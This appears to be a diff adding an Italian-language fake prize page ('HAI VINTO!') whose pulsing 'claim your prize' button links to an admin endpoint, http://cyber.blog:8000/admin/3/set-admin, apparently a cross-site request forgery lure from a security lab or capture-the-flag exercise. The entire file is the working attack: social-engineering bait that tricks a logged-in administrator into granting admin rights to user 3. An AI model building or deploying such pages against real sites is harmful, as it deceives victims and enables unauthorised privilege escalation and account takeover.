@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Congratulazioni!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            /* Una bella immagine di sfondo come premio */
+            background: url('https://images.pexels.com/photos/1766838/pexels-photo-1766838.jpeg') no-repeat center center fixed;
+            background-size: cover;
+        }
+        .container {
+            max-width: 600px;
+            text-align: center;
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+        }
+        .button {
+            display: inline-block;
+            padding: 15px 30px;
+            font-size: 20px;
+            color: #fff;
+            background-color: #28a745; /* Verde successo */
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background-color 0.3s;
+            animation: pulse 2s infinite; /* Un effetto pulsante per invitare al clic */
+        }
+        .button:hover {
+            background-color: #218838;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 5px rgba(40, 167, 69, 0.5); }
+            50% { transform: scale(1.05); box-shadow: 0 0 15px rgba(40, 167, 69, 0.5); }
+            100% { transform: scale(1); box-shadow: 0 0 5px rgba(40, 167, 69, 0.5); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🏆 HAI VINTO! 🏆</h1>
+        <p>Sei l'utente numero 1.000.000! Clicca qui sotto per ritirare il tuo premio speciale.</p>
+        <br>
+        <a href="http://cyber.blog:8000/admin/3/set-admin" class="button">RITIRA IL MIO PREMIO</a>
+    </div>
+</body>
+</html>
